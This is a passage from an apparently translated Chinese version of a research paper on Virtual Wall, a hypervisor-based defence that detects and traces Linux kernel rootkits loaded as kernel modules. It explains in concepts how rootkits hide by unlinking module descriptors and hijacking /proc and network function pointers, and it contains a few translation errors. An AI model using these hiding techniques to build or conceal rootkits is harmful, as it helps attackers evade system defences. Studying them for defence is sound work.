Modules，LKM）的形式出现。这些模块隐藏于其他的内核对象之间，且可以通过篡改内核服务函数所需的元数据来重定向内核控制流。内核 rootkits 在载入后对用户是不可见的，这可能绕过大部分的安全防护。rootkits 在时间与空间上的表现都是分散的，这使其变得难以被发现或移除。为了解决 rootkit 的威胁，我们提出了一种通用的 <em>虚拟墙</em> （Virtual Wall，VTW）方案以通过跟踪所带来的内核活动来过滤出嵌入了 rootkit 的 LKMs。这种 VTW 本质上是一个带有 rootkit 检测与时间追踪能力的轻量级 hypervisor。通常情况下 Linux 在 Guest 模式下运行，当一个 LKM 的执行损害了 VTW 所设置的安全策略时，OS 控制权将转换到 Host 模式，在 Host 模式的 VTW 及时地启用检测并跟踪 rootkit 事件。换言之，潜在的 rootkit 攻击会被检测、被追踪并被分类以做出有意义的过滤决策。整个检测与追踪过程基于内存访问控制与事件注入机制。实验性质的结果展示了 VTW 防护系统在及时检测与防御内核 rootkit 上是高效的，且执行 VTW 的 CPU 开销小于 2%。相较于其他的防护机制（如 DIKernel 等），我们的 vs 更容易以低性能开销应用于 Linux 服务器。我们还会将我们的系统与七个其他的 rootkit 防御系统进行对比。</p><p><strong>Index Terms</strong>——访问控制，数据完整性，操作系统安全，内核保护与系统架构。</p><h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1 Introduction"></a>1 Introduction</h1><p>由于内核 rootkit 的高权限与因此特性，其被广泛应用于 Linux 服务器的内核攻击中。如今已知的内核 rootkits 大都以 <em>可装载内核模块</em> （Loadable Kernel Modules，LKM）的形式出现，这些模块可以重定义内核内容函数、隐藏自身并隐藏目标对象。</p><p>可隐藏的特性允许内核 rootkit 通过 “基于 host 的” 架构绕过安全工具。自从这些工具更低的权限限制了他们的检测范围，更糟糕的是他们基于 <em>目标操作系统</em> （target operating system，TOS）环境，这导致检测结果的可靠性必须基于 TOS 的完全安全。不幸的是，内核 rootkit 可以偷偷篡改 TOS 环境以破坏其安全。</p><p>为了实现他们的功能，内核 rootkit 需要篡改内核对象。内核 rootkit 的操作对象包括多种数据，例如控制数据、非控制数据、静态数据与动态数据。理论而言，内核安全可以通过限制所有对指定内核数据的窜改来确保。</p><p>然而，不同的数据通常在内核空间中分散存储，带有不同特性的数据可能会存放在同一张内存页中。因此，基于页的保护机制无法在不影响其他内核数据的情况下保护目标数据。</p><p>在攻击中，内核 rootkit 需要篡改的内核数据通常仅有几字节。同时，最小的内存权限管理粒度为一张页，其通常占用 4KB。也就是说，为了保护数个字节，我们需要限制所有可执行实体对目标数据所在页的写操作。</p><p>在数据大小与保护粒度间的不匹配破坏了其他内核对象的原始属性，这影响了相关的执行实体的功能与表现。例如，内核数据结构中的 VFS 函数指针条目通常为内核 rootkit 要篡改的目标数据。尽管该条目并不会被动态更新，与其共址的状态描述条目可能会在执行实体运行时被更新。若对状态描述的写权限被限制，则关联的执行条目将被影响。</p><p>内核 rootkit 有着所有的 LKM 特性，他们可以调用自定义函数或装载 rootkit 的导出函数以篡改内核数据。他们可以在装载时或是在他们生命周期的任何时刻启动一次攻击。因此，内核 rootkit 可以是任何将被或已被装载的 LKM，参与到一次攻击的内核 rootkits 便可能是一个或多个 LKMs。</p><p>从时间层面，内核 rootkit 的攻击时间是随机的；从空间层面，在一次攻击中的参与者是分散的。这两种特性使得内核 rootkit 的攻击事件难以预测、攻击的参与者难以追踪，这极大地影响了系统安全。</p><p>攻击开始时间的随机性使得基于单个或周期性的检测仅能达到时候检测的效果。当这些方法被执行时，内核 rootkits 的攻击可能已经完成了，甚至所有的 rootkits 都可能被移除了。结果便是，他们的检测与防护效果将被极大地影响。内核 rootkits 间的依赖关系使得攻击的形式更加多样化。</p><p>透过依赖关系，内核 rootkit 可以连接多个 LKMs 以用作内核攻击。现有的安全方案仅能检测当前攻击的直接发起者，但无法识别在整个攻击过程中的其他参与者。未被检测的攻击者将一直潜伏于操作系统中，等待条件成熟时再次发起攻击。</p><p>我们提出了一种内核 rootkit 过滤方法 VTW 以保护内核功能，例如系统调用表、内核只读对象、LKM 状态描述符、<code>&quot;proc&quot;</code> 文件函数指针、网络文件指针等。这种方法使用 Intel VMX 技术以将操作系统分为两种模式：“host” 与 “guest”。</p><p>跨过两种执行模式，我们为压紧内核 rootkits 创建了检测、预防、跟踪策略。本论文的主要贡献总结于如下四个技术层面：</p><p>1） 建立了一个轻量级的 hypervisor。其使用 Intel VMX 技术来重构系统执行模式，使得对内核资源的访问更能被检测到。</p><p>2） 建立了一个资源访问控制机制。其可以感知对目标内存访问的感知、限制、操控，且支持我们在 “guest” 模式下监控与控制执行路径。</p><p>3） 建立一个控制流跟踪机制。该机制支持跟踪不同 LKMs 的控制流跳转与返回。</p><p>4） 创建了一个检测、防护、跟踪内核 rootkits 的安全框架。通过上述架构与机制，内核 rootkits 攻击可以被检测与防护。这是第一次有一种跟踪单次攻击中所有参与的内核 rootkits 的方法被开发。</p><h1 id="2-Related-Previous-Work"><a href="#2-Related-Previous-Work" class="headerlink" title="2 Related Previous Work"></a>2 Related Previous Work</h1><p>由于其良好的抗干扰能力，基于虚拟化的内核保护方法已经受到了额外的关注。尤其是对内核 rootkits 而言，这些方法展示了出色的优点。他们可以被分为两种：入侵式方法与非入侵式方法，前者需要向 <em>目标虚拟机</em> （target virtual machine，VTW）注入额外的内容以获取所需信息而后者不需要。</p><p><em>侵入式方法</em> （Intrusive Methods）。由 Sebastion 最先提出的 X-TIER 将一个内核模块插入到目标虚拟机，接下来其通过模块来读取 TVM 数据结构以获取其状态信息。在这之后 X-TIER 通过 hypercall 将所需信息传递给 hypervisor。</p><p>SYRINGE 使用函数调用注入技术来在 TVM 外启用对 TVM 函数的调用，与此同时局部牧羊技术被用于检测控制流完整性。</p><p>Virtuoso 继续从控制逻辑的角度获取 TVM 状态信息。其在 TVM 中多次运行程序并提取相关指令与相关执行路径，之后生成内省代码所需的路径被翻译，最后 Virtuoso 将所有的信息翻译成可以在 TVM 外进行语义重构的代码。</p><p>X-TIER、SYRINGE、Virtuoso 通过分析物理内存并以其作为真实视角而获得语义视角。他们可以通过对比真实的语义视角与 TVM 的内部视角来找到隐藏的对象，如进程与文件。若存在一个隐藏对象，则他们断定 TVM 已经被破坏而一个内核 rootkit 可能存在于 TVM 中。VMST 在 rootkit 检测上使用同样的方法。</p><p><em>非入侵式方法</em> （Non-Intrusive Methods）。VMwatch 的第一步是获取 TVM 的内存，之后使用 TVM 的内核数据结构作为模板来理解内存所表示的操作性状态。</p><p>与 VMwatcher 不同，RTKDSM 为一个实时系统，其可以被分为两部分：内省代理与监控代理，前者放置在一个安全的虚拟机中，后者则放置在 hypervisor 中。RTKDSM 可以通过交叉对比来对数据结构进行实时监控。</p><p>上述方法可以被用以检测被内核 rootkits 隐藏的对象，然而这些方法基于如 Xen 的巨型虚拟化平台，且需要克服虚拟机内省的语义缺陷。结果便是，他们向操作系统引入了一个显著的性能开销。</p><p>例如，RTKDSM降低了一些应用 110% 的执行速度。SYRING 在系统调用上延迟到 51ms，这对系统调用而言是一个显著的性能开销。除了 RTKDSM，没有任何的上述方法可以实时监控与检测操作系统。</p><h1 id="3-Virtual-Wall-Architecture"><a href="#3-Virtual-Wall-Architecture" class="headerlink" title="3 Virtual Wall Architecture"></a>3 Virtual Wall Architecture</h1><p>VTW 是一个带有内核 rootkit 防护功能的轻量级 hypervisor。本节我们将介绍其总体架构。</p><h2 id="3-1-Assumptions-and-Notational-Definition"><a href="#3-1-Assumptions-and-Notational-Definition" class="headerlink" title="3.1 Assumptions and Notational Definition"></a>3.1 Assumptions and Notational Definition</h2><p>我们假设攻击者可以将一个 LKM 注入到 TOS 中。现实中，攻击者可以通过应用漏洞提高权限并通过后门来控制 TOS，之后一个 LKM 可以被注入到内核。我们同样假设 TOS 与非恶意执行实体不会非法篡改内核数据与内核控制流。此外，本论文所用定义展示于表 1 中。</p><h2 id="3-2-Design-Objectives"><a href="#3-2-Design-Objectives" class="headerlink" title="3.2 Design Objectives"></a>3.2 Design Objectives</h2><p>VTW 被设计为带有如下指定的三个技术需求：</p><p>1） <em>实时检测</em> （Real-time Detection）。内核 rootkits 可能在模块加载阶段启动一次攻击，或是在模块位于内存中的时间中的任何时间。若检测在 LKM 被载入后或被移除后完成，则检测结果可能不精确，浙江影响后续的检测与追踪。因此，VTW 需要在模块载入完成前或在其生命周期中检测 rootkits 的有害操作以保护内核数据的完整性。</p><p>2） <em>高效防护</em> （Effective Defence）。rootkits 操作的内核对象包括静态与动态的内核数据。对于静态内核数据，VTW 需要确认他们未被篡改。对于动态内核数据，VTW 需要确保他们在被篡改后可以被恢复。</p><p>3） <em>综合可追踪性</em> （Comprehensive Traceability）。攻击代码可能在 rootkit 所属内存空间中，也可能在 rootkit 所依赖的其他模块的代码空间中。VTW 需要定位所有与当前有害操作相关的 LKMs。</p><h2 id="3-3-System-Architecture-of-Virtual-Wall"><a href="#3-3-System-Architecture-of-Virtual-Wall" class="headerlink" title="3.3 System Architecture of Virtual Wall"></a>3.3 System Architecture of Virtual Wall</h2><p>VTW 的防护过程如 图.1 所示。防御模式需要通过初始化来建立，之后应用访问控制方案，最后同时连带完成检测与跟踪以在 rootkit 过滤中进行高速决定。</p><p><img src="https://s2.loli.net/2023/04/06/XyHTQfdiP9YZk7S.png" alt="图.1 virtual wall 操作过程"></p><p>VTW 的架构如 图.2 所示。VTW 由 ModeHandler、MemHandler、ControlHandler、SPE（Security Policy Engine，安全策略引擎）组成。ModeHandler 的任务是确保在 “guest” 与 “host” 模式之间的正常模式切换。</p><p><img src="https://s2.loli.net/2023/04/06/ZrhVFxDmM3gERbI.png" alt="图.2 VTW 防护系统架构"></p><p>MemHandle 的任务是通过建立一组独立的地址页表来从 “guest” 上隔离安全内容物。此外，其借用 EPT （译注：Extend Page Table，扩展页表）来实现 VTW 的自我防护与透明部署。ControlHandler 完成 rootkit 的检测、预防、分析。</p><p>SPE 为每个内容物提供安全策略，例如为静态内核数据提供权限设置、为动态内核数据提供合法性约束、为控制流提供追踪路径。所有对 SPE 的损坏都将导致操作系统从 “guest” 陷入 “host”。</p><h3 id="3-3-1-Resetting-of-OS’s-Privilege-Mode"><a href="#3-3-1-Resetting-of-OS’s-Privilege-Mode" class="headerlink" title="3.3.1 Resetting of OS’s Privilege Mode"></a>3.3.1 Resetting of OS’s Privilege Mode</h3><p>ModeHandler 使用 Intel VMX Non-Root 与 Intel VMX Root 来将原生操作系统分为 “guest” 与 “host” 模式。这两种模式将 ring0 分为两个特权级，称为完全型 ring0 与限制型 ring0。在 “host” 模式下，VTW 位于完全型 ring0 级，可以完全接管内核控制流。在 “guest” 模式下，内核位于限制型 ring0 级，任何损坏 SPE 的行为都将造成操作系统陷入到 “host” 模式。</p><p>在 图.3 中，ProtectionWall为 ModeHandler 与 MemHandler 的功能属性的抽象，KernelProtector 为 ControlHandler 的功能属性的抽象。</p><p>若 guest 模式下的一条指令会损坏安全策略，则其将造成操作系统切换到 host 模式。ProtectionWall 将拒绝所有在 guest 模式下的操作并唤醒 KernelProtector 使用 SPE 处理该攻击。</p><p><img src="https://s2.loli.net/2023/04/06/Qt4skOVGPNJcLS2.png" alt="图3. Linux 内核操作中在 guest 与 host 模式间的条件跳转"></p><h3 id="3-3-2-Creating-Private-Page-Tables"><a href="#3-3-2-Creating-Private-Page-Tables" class="headerlink" title="3.3.2 Creating Private Page Tables"></a>3.3.2 Creating Private Page Tables</h3><p>MemHandler 为 host 创建一组私有页表以分割两种模式的地址空间，私有页表的创建条件如 表2 所示。</p><p>存储与内核数据段中的内核数据 $swapper_pg_dir$ 指向内核地址空间的页目录，所有执行实体的内核地址空间基于 $swapper_pg_dir$ 构建。在 表2 中，所有私有页表组成一个元组 $\rho$  ，且所有由 $swapper_pg_dir$ 指向的页表组成一个元组 $\varepsilon$ （①~②）。</p><p>当 MemHandler 被初始化，其会根据 $\varepsilon$ 创建页目录表（$h_pml4e$）、页顶级目录（$h_pdpte$）、页中间目录（$h_pde$）、页表（$h_pe$）。</p><p>我们首先基于页表集 $\rho$ （③）的内存 $V_{22}$ 创建一份等量的内存 $V_{1}$ ，接下来我们使用每个 $h_pdpte$ 的物理内存填充 $h_pml4e$ 的条目、使用每个 $h_pde$ 的物理内存填充 $h_pdpte$ 的条目、使用每个 $h_pe$ 的物理内存填充 $h_pde$ 的条目。</p><p>最后，MemHandler 拷贝 $\varepsilon$ 的最后的页表中所有的页条目至 $h_pe$ 。当 “host” 中出现一个页表错误时，VTW 根据 $\varepsilon$ 更新错误的页表。</p><p>为了确保 VTW 的透明性，MenHandler 建立了一种 EPT 重定向方法，该方法使得 VTW 的内容对 “guest” 而言是不可见的。其根据 VTW 的每个内容物的物理内存重定向 EPT 的页表项至一个被设为可读、可写、可执行（⑧~⑩）的空页。当 “guest” 中的实体想要访问 VTW 的物理内存时，被访问的内存为一个 <em>“$伪页$”</em> （pseudo page）。</p><p>由于整个内核共享一个相同的地址空间，每个执行实体可以映射包括 VTW 在内的所有内核内容。因此，VTW 不需要任何过程便能被检测与分析。若我们仅仅删除了寻址 VTW 的 EPT 条目，则当一个实体探索内核地址空间时，操作系统将不断地陷入 “host”。</p><p>一方面，频繁的陷入将影响执行效率；另一方面，异常的内存访问时间与空间将使得攻击者推断出 VTW 的存在。将 VTW 的所有地址空间重定向至伪物理页面可以排除由内存探测造成的时间与空间异常，这增强了 VTW 的透明性。</p><h1 id="4-Resource-Access-Control"><a href="#4-Resource-Access-Control" class="headerlink" title="4 Resource Access Control"></a>4 Resource Access Control</h1><p>VTW 通过 MemHandler 控制内存访问。MenHandler 使用 EPT 来控制 “guest” 模式中的内存访问。通过 EPT 提供的内存权限管理，我们可以感知、跟踪、控制 “guest” 对所有内存页面的访问。MenHandler 可以非常简便地通过设置 EPT 最后一级的权限位来部署。</p><p>为了达成对内核更细粒度的访问控制，ControlHandler 建立了一个包括设置断点、注入通用保护异常、执行单步调试的事件注入机制。我们将在本节描述这些，并展示于 表3 与 “资源访问控制过程”（Resource Access Control Procedure）。</p><h2 id="4-1-Conditioning-for-Resource-Access-Control"><a href="#4-1-Conditioning-for-Resource-Access-Control" class="headerlink" title="4.1 Conditioning for Resource Access Control"></a>4.1 Conditioning for Resource Access Control</h2><p>表3 为设置资源访问控制的条件。①<del>⑨用于设置断点，断点的类型可以依据目标对象分为指令与数据断点。ControlHandler 使用 Dr0</del>Dr3（断点地址寄存器于集合 $DeReg$ 中）与 DR6<del>DR7 （断点管理寄存器，于集合 $DeCon$ 中）来设置不同类型的断点（①</del>②）。</p><p>在设置一个指令断点时，首先通过函数 $SetDeReg$ 将指令地址（ $Iaddr$ ）写入到断点地址寄存器（③），接下来 Dr7 对应的 R&#x2F;W 位被设置为 01（数据写中断），对应的 LEN 位被设置为 10 （数据大小为 8 字节），如 ⑦<del>⑧所示。在完成断点设置之后，ControlHandler 同样需要清除 Dr6 （⑨）的 B0</del>B2 （位 2:0)。</p><p>为了控制 “guest” 的执行，ControlHandler 为操作系统设置单步执行调试。ControlHandler 首先读取 VMCS 中 guest 状态域中的 EFLAGS 的内容，记录目标信息（⑬）。接下来其将 EFLAGS.TF （陷阱标志位）设置为1（⑭），这将处理器设为单步执行模式。最后，ControlHandler 将修改后的内容再次写入 EFLAGS。最后 Dr6 的 BS（位 14）被设为 0。</p><h2 id="4-2-Resource-Access-Control-Procedure"><a href="#4-2-Resource-Access-Control-Procedure" class="headerlink" title="4.2 Resource Access Control Procedure"></a>4.2 Resource Access Control Procedure</h2><p>该程序用以控制指令执行与数据访问。步骤 1<del>4用以获得断点，步骤 5</del>6 用以堵塞 “guest” 中的目标指令，步骤 7~8 用以在执行目标指令后获取操作系统的状态。</p><p><img src="https://s2.loli.net/2023/04/08/OVLpw5DtBHcr4PJ.png" alt="image.png"></p><p>当一个执行实体像一个断点位置写入数据（步骤1<del>2）或是在 “guest” 模式下执行一个断点指令（步骤 3</del>4），其会触发到 “host” 模式的模式切换（$SysMod$）。Dr6 中的 B0 ~ B2 被用以区分断点的位置。通过设置断点，VTW 实现了字节级别的资源访问。</p><p>当一个通用保护被设置，运行在 “guest” 模式下的操作系统将生成一个 #GP 异常，由此当前操作将会被阻塞（步骤 5~6）。当单步调试启用，操作系统将在 “guest” 下执行任意指令后触发一个调试异常并陷入到 “host” （步骤 7 ~ 8 ）。通过设置单步调试，我们可以为操作系统实现指令粒度的资源访问控制，并通过 $get_status$ 获得由每条指令所造成的对操作系统状态的改变。</p><h1 id="5-Rootkit-Defense-Strategies"><a href="#5-Rootkit-Defense-Strategies" class="headerlink" title="5 Rootkit Defense Strategies"></a>5 Rootkit Defense Strategies</h1><p>我们依据攻击时间将内核 rootkits 的攻击分为三类。第一类中 rootkits 在加载时攻击内核，其会通过 $module_init()$ 调用特定函数以实现他们的攻击。</p><p>内核 rootkits 的有害行为可能在以上三类攻击中的其一或数个中出现，同时与当前攻击所关联的 rootkit(s) 可能会是正在被加载的 LKM、已加载的 LKM，抑或两者都是。</p><p>VTW 决定一个 LKM 是否为一个内核 rootkit。对于内核 rootkits，VTW 通过阻塞他们的破坏行为并恢复被破坏的数据来对抗他们。rootkit 检测方法如 “Rootkit 攻击检测” 所示，条件设置展示于 表4 中。该方法可以被用以预检测静态与动态的内核对象。</p><p><img src="https://s2.loli.net/2023/04/08/pX1lVcQrSfg5wiK.png" alt="image.png"></p><p><em>Rootkit 攻击检测</em> （Detection of Rootkit Attacks）。其被用以检测内核 rootkit 并保护内核不被摧毁。步骤 1 ~ 5 用于静态内核对象保护，步骤 6 ~ 8 用于隐藏检测，步骤 9 ~ 11 用于动态内核对象保护。</p><p><img src="https://s2.loli.net/2023/04/08/PvFmjXe2TyQLi4K.png" alt="image.png"></p><h2 id="5-1-Static-Kernel-Object-Protection"><a href="#5-1-Static-Kernel-Object-Protection" class="headerlink" title="5.1 Static Kernel Object Protection"></a>5.1 Static Kernel Object Protection</h2><p>静态内核对象（$\mu$ 与 $\xi$）在操作系统中保持不被改变。特定的内核控制流执行路径与一些重要的数据被存放于静态内核对象中。内核 rootkits 可以通过破坏静态内核对象的完整性来达成他们的恶意目的。</p><p>为了保护静态内核对象（如操作系统代码段、数据段、系统调用表等），VTW 通过分析文件 $”System.map”$ 或从内核代码段提取以获得他们的线性地址，并将其翻译为物理地址。</p><p>之后，VTW 设置标识这些物理地址的 EPT 条目（$\zeta$）的写权限为 “不可写”（表4 中的 ④ ~ ⑤）。在 “guest” 模式中，对静态内核对象的写操作（$WriteTo$）将触发 “EPT violation” 造成操作系统陷入到 “host” （“Rootkit 攻击检测” 中的 步骤 1）。接下来，VTW 注入一个 #GP 异常（$InjectGP$） 到 “guest” 中以预防 LKM 摧毁内核数据（步骤 2）。</p><p>需要注意的是最小的内存保护粒度为一张 “页”。然而并非所有的静态内核对象都占用完数个页，因此当一个 “EPT 损坏” 异常被抛出，VTW 首先确认异常地址是否属于被保护对象的地址范围。</p><p>若是，则当前操作会被阻塞，若否，则 VTW 将设置 “guest” 为单步执行模式（步骤4 中的 $SingleStep$ ）。接下来其将页设置为 “可写的” （步骤 5）。最后 VTW 将操作系统切换回 “guest” 模式以完成后续的写入。在这之后，操作系统重新陷入 “host”，VTW 通过函数 $OpenWrite$ 将页恢复到 “不可写” 。</p><h2 id="5-2-Dynamic-Kernel-Object-Protection"><a href="#5-2-Dynamic-Kernel-Object-Protection" class="headerlink" title="5.2 Dynamic Kernel Object Protection"></a>5.2 Dynamic Kernel Object Protection</h2><p>内核 rootkits 可以通过篡改动态内核数据来达成如劫持控制流的恶意目的。被篡改的内核数据包括控制数据与非控制数据，前者指的是指向内核控制流的指针。</p><p>这些指针通常被用于构造语义视角，例如存储于 $”proc”$ 文件系统中的函数指针。后者则指某些状态描述符中的一些条目，如 $”struct module”$ 中的条目 $”prev”$ 与 $”next”$。</p><p>实时更新的内核数据与被 rootkits 篡改的目标数据可能会存放在同一张页中，因此我们无法通过限制内存页的写权限来预防内核 rootkits 篡改内核数据。</p><p>此外，攻击时间的随机性使得实时检测篡改操作变得困难。面对这些问题，VTW 跟踪 LKMs 的执行，并在 LKM 追踪中检测动态内核数据。</p><h3 id="5-2-1-Hidden-Kernel-Detection"><a href="#5-2-1-Hidden-Kernel-Detection" class="headerlink" title="5.2.1 Hidden Kernel Detection"></a>5.2.1 Hidden Kernel Detection</h3><p>自我隐藏是内核 rootkit 的基本特性，隐藏行为可以被作为判断一个 LKM 是否为一个 rootkit 的标准。通常情况下，内核 rootkits 在初始化时实现自我隐藏。</p><p>因此，VTW 需要在其初始化完成之前检测其是否被隐藏。为了追踪模块初始化，我们在 $sys_init_module()$ 设置了一个指令断点并监控 LKM 的状态改变。当状态被切换到 $MODULE_STATE_LIVE$ 时，VTW 会检查模块是否被隐藏。内核 rootkits 通过从链表上移除他们的状态描述符来破坏与其他对象的逻辑连接以进行隐藏，LKMs 之间的逻辑连接可以被用来确认模块是否被隐藏。</p><p>$\mathscr{M}$c 为 LKM 正在被装载，$\mathscr{M}$p 为被$\mathscr{M}$c 中的条目 $prev$ 指向的模块，$\mathscr{M}$n 为被 $\mathscr{M}$c 中条目 $next$ 所指向的模块（表4 中的 ⑦~⑧）。若模块 $\mathscr{M}$c 与其相邻节点并不存在链表连接关系（“Rootkit 攻击检测” 中的步骤 6 ），或连接关系不完整（步骤 7 ~ 8），则我们判断 模块 $\mathscr{M}$c 被隐藏了。</p><h3 id="5-2-2-Dynamic-Kernel-Data-Detection"><a href="#5-2-2-Dynamic-Kernel-Data-Detection" class="headerlink" title="5.2.2 Dynamic Kernel Data Detection"></a>5.2.2 Dynamic Kernel Data Detection</h3><p>除了状态描述符外，内核 rootkits 还会篡改带有控制属性的内核数据以进行内核控制流重定向。在重定向前这类内核数据又指向内核代码段的指针组成，内核 rootkits 重写指针以重定向到他们的自定义代码。</p><p>被重定向的对象主要包括多种用于构建操作系统语义视角的操作函数。$”proc”$ 文件系统中的函数指针（例如 $lookup$）对内核 rootkits 而言为最脆弱的对象，因此有必要保护这些函数指针不被篡改。</p><p>为了隐藏网络连接（例如网络端口），内核 rootkits 还会攻击  $”&#x2F;proc&#x2F;net&#x2F;tcp”$、$”&#x2F;proc&#x2F;net&#x2F;tcp6”$ 、$”&#x2F;proc&#x2F;net&#x2F;udp”$ 、$”&#x2F;proc&#x2F;net&#x2F;udp6”$ 中的数据，因此这些文件描述符中的函数指针同样需要被保护。</p><p>除了上述内核对象，VTW 还要将如 $”root”$ 与 $”log”$ 这样关键文件的函数指针作为保护对象。所有的函数指针与他们的存储地址可以在 VTW 初始化中通过特定的数据结构（如 $f_dentry-&gt;d_inode-&gt;i_op-&gt;lookup$）从内存中提取。</p><p>所有被提取的数据形成一个集合 $k$ ，$k$ 中所有的动态内核数据指向固定的内核函数且不需要被更新。仅当我们发现一个新的内核 rootkit 修改一个不在 $k$ 中的某些内核数据时我们才扩展 $k$。此外，VTW 通过 EPT 将 $k$ 设置为读写保护，并禁止 “guest” 中的执行实体访问 $k$ 以保护他。</p><p>现在 $k$ 占用大概 64KB 的内存且包含 4000 份内核数据，其将根据新 rootkits 的突发情况而增长。在实战中，现有的内核 rootkits 通常修改不超过 500 份内核数据。我们将范围扩大以进行更好的保护。</p><p>$k$ 中的每个元素 $D$ 对应一个独特的内核对象（表 4 中的 ⑨）。元素 $D$i 作为二元数据对 （$a$i，$c$i）存在，$a$i 表示被保护的数据的地址，$c$i 则表示数据内容（⑩）。X 为内核代码范围$s \sim _\mathscr{e}$ （⑪）的范围。</p><p>在 LKM 的执行中，VTW 会检测地址 $a$i 上的内核数据 $c$i$’$ 是否指向内核代码段（⑫）。若存在 $c$i 并不指向内核代码段，则其可以确认内核控制流被重定向了（“Rootkit 攻击检测” 中的 10）。在检测到被篡改的内核数据 $c$i$’$ 后，VTW 读取在 $D$i 中保存的  $c$i 并将其写入到 $D$i.$a$i （步骤 11）。之后被篡改的内核数据恢复到了其初始值。</p><p>与内核 rootkits 不同，合法的 LKMs 不会修改状态描述符以进行自我隐藏，也不会修改带有系统函数指向特性的扩展数据以进行控制流重定向。</p><p>此外，我们保护动态内核数据的方法为在 LKM 执行的特定阶段检查被保护数据的完整性（例如调度与跳转），而非限制所有执行实体对属于内核数据的数据结构的访问。结果便是 VTW 可以从所有的 LKMs 中识别出 rootkits 且不会影响到其他 LKMs 的执行。</p><h2 id="5-3-Bypassing-Resistance-of-VTW-Effects"><a href="#5-3-Bypassing-Resistance-of-VTW-Effects" class="headerlink" title="5.3 Bypassing Resistance of VTW Effects"></a>5.3 Bypassing Resistance of VTW Effects</h2><p>以 VTW 的加载时间作为分界点，LKMs 可以被分为已被装载的 LKMs 与未被装载的 LKMs。当 VTW 被成功加载后，其可以及时监控并控制所有未被装载的 LKMs 的装载与执行，使其无法绕过检测。</p><p>对于在 VTW 载入前被装载的 LKMs，VTW 无法在 “host” 模式下常规地检测与跟踪，因为这会提高绕过 VTW 的风险。</p><p>有两个解决该问题的方法。其一是将 VTW 设为开机时启动，这样绝大部分的 LKMs 都会被包含在监控范围内，然而这种办法对于那些同样在开机时启动的 LKMs 而言仍是无效的。</p><p>第二种方法便是使用内核完整性检查的办法来定位有害的 LKM。被重定向的控制流属于 rootkits，可以通过将 LKM 列表中的控制流地址（$mal_addr$）与每个代码段（$module-&gt;core,module-&gt;core+module-&gt;core_size$）进行配对以确定 rootkit 是否已被隐藏。若是，$mal_addr$ 将被作为定位隐藏 LKM 的起始点。过程如 图.4 所示。</p><p><img src="https://s2.loli.net/2023/04/08/ZY8sMaE7ehj2BSH.png" alt="图.4 定位隐藏的“struct module”"></p><p>LKM 的代码段与数据段在虚拟空间中是连续的，他们的最后一级页表项是相邻的。因此，通过使用他们之间不同的可执行性（最后一级页表项的 NX 位），代码段的末尾地址（$code_end$）与数据段的起始地址（$data_start$）可以被识别。</p><p>在这之后，我们使用数据段的读写权限（最后一级页表项的 RW 位）来获得可写数据段的起始地址（$writable_data_start$）。LKM 的状态描述符（$struct\ module$）便存放在可写数据段中。</p><p>根据 LKM 代码段按页对齐的特性，代码段的起始地址为 $data_start$-$N * page_size$ ，其值为 $module-&gt;module_core$。从 $writable_data_start$ 开始，我们假设每个字节的起始地址便是 LKM 代码的第一个地址。</p><p>接下来我们基于 $module-&gt;module_core$ 与 $module-&gt;core_text_size$ 间的相对位移计算 $module-&gt;core_text_size$ 的地址，对  $module-&gt;module_core$ 与 $module-&gt;core_text_size$  的正确表示为最后 12 位都为0、两者总和位 $data_start$。</p><p>之后我们以一个单字节作为步长检查所有在 $writable_data_start$ 之后的内存，直到我们获得合适的 $module-&gt;module_core$ 与 $module-&gt;core_text_size$ 。最后，module 结构体的第一个地址使用与 $struct\ module$ 相关的 $module-&gt;module_core$ 的偏移进行计算。相比于第一种方法，这种方法有着更大的范围，但实现过程相对更加复杂。 VTW 同时使用两种方法来达成最佳的防护效果。</p><h1 id="6-Rootkit-Tracing-Process"><a href="#6-Rootkit-Tracing-Process" class="headerlink" title="6 Rootkit Tracing Process"></a>6 Rootkit Tracing Process</h1><p>内核 rootkit 可能在 LKM 正在加载时或已被加载后发动攻击，单次攻击的参与者可能是单个或多个模块。</p><p>我们将修改内核数据的直接发起者作为行为载体，攻击的最初发起者称为动作载体，其代码替换了原始内核函数的 LKM 称为函数载体。</p><p>为了追踪所有参与了一次攻击的内核 rootkits，VTW 带来了两种新的方法：“跟踪此前与此后的 rootkit 攻击” 与 “攻击回放程序”，这些方法所需的条件如 表5 所示。</p><p><img src="https://s2.loli.net/2023/04/09/mnQvHSb8W5ANkg4.png" alt="image.png"></p><p>其他参与了攻击的 LKMs 被称为过程载体。这些载体之间可能存在重叠，例如正在被装载的 LKM 可以重定向内核控制流到导出函数，在这次攻击设想中，LKM 同时属于动作载体与行为载体，被装载的 LKM 属于函数载体，不存在过程载体。</p><p>所有被监控的 LKMs 形成了元组 $T$ ，所有参与了同一事件的 LKMs 形成了元组 $\mathscr{R}$ （表5 中的①）。当一个 LKM 正在运行，我们开启其执行权限，同时除了在其他 CPU 核心上正在运行的 LKMs 以外，其他所有 LKMs 的执行权限都被关闭（②）。所有运行在不同核心上的 LKMs 形成一个元组 $\mathscr{F}$ （表5 中的 ③）。要被调度以执行的 LKM （$\mathscr{F}$j）与第 k 个 CPU 核心关联（④），LKM 所属的内存被记录为 $\alpha$ （⑤）。</p><h2 id="6-1-Trace-LKM-Execution-Events"><a href="#6-1-Trace-LKM-Execution-Events" class="headerlink" title="6.1 Trace LKM Execution Events"></a>6.1 Trace LKM Execution Events</h2><p>有三种执行 rootkit 的方式，第一种为 LKM 在模块加载时调用其初始化函数，在这种情况下攻击可能在加载完成前被启动。</p><p>第二种为 LKM 在完成载入之后其导出函数被其他模块调用，被加载的 LKM 可以被调用以修改内核数据，或是被用作函数载体来替换内核的原始函数。</p><p>第三种为 LKM 被通过创建一个内核线程而执行，攻击可以在线程生命周期的任意时间被触发。</p><p>一个完整的攻击可能包括一种或多种上述的执行。为了监控 LKM 的执行，VTW 设置了目标已被装载 LKMs 为不可执行。</p><p>然而由于大量的内存设置操作，这种办法是低效的。以一个有着 4MB 代码段的 LKM 为例，VTW 必须要操作 EPT 页表多余 2000 次以完成一次执行权限的开启与关闭。为了减少页表设置操作的数量，VTW 建立了一种机制来管理 LKM 的执行权限，如 图.5 所示。</p><p><img src="https://s2.loli.net/2023/04/09/WcROlmhj4Yix2Aw.png" alt="图.5 页表重定向机制"></p><p>VTW 首先通过 $”struct \ module”$ 获得 LKM 代码段的地址范围，接下来其计算最后一级可以查找整个 LKM 代码地址范围的页表（$last_page_table$）。在其上层页表保存了 $last_page_table$ 地址的页表入口 （$orig_item$ ）将会被记录。</p><p>在这之后，VTW 创建一个新的页表 （$new_last_page_table$） 并通过 EPT 将其设为 “不可写”。其会使用 $new_last_page_table$ 